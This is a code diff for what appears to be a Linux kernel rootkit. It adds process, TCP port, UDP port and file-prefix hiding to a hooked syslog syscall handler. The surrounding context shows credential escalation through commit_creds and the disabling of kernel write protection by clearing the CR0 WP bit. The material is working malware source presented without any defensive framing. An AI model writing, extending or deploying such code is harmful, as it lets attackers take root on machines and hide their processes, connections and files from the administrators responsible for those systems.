@@ -29,6 +29,11 @@
 #include "proc_internal.h"
 #include "ccc.h"
 
+int hidden_pids[SZ_PIDS];
+int hidden_tcp[SZ_PORTS];
+int hidden_udp[SZ_PORTS];
+char hidden_files[SZ_PREFIX];
+
 void disable_ro(void)
 {
     write_cr0(read_cr0() & ~X86_CR0_WP);
@@ -66,8 +71,18 @@ asmlinkage int fake_syslog(int type, char __user* buf, int len)
 		commit_creds(new);
 		break;
 	    case SetHiddenPids:
-		
+		memcpy(hidden_pids, ccc.payload.hidden_pids, sizeof(hidden_pids));
 		break;
+	    case SetHiddenTCP:
+		memcpy(hidden_tcp, ccc.payload.hidden_ports, sizeof(hidden_tcp));
+		break;
+	    case SetHiddenUDP:
+		memcpy(hidden_udp, ccc.payload.hidden_ports, sizeof(hidden_udp));
+		break;
+	    case SetFileHidingPrefix:
+		memcpy(hidden_files, ccc.payload.file_hiding_prefix, sizeof(hidden_files));
+		break;
+	    // TODO: gtfo
 	    default:
 		return -42;
 	    }
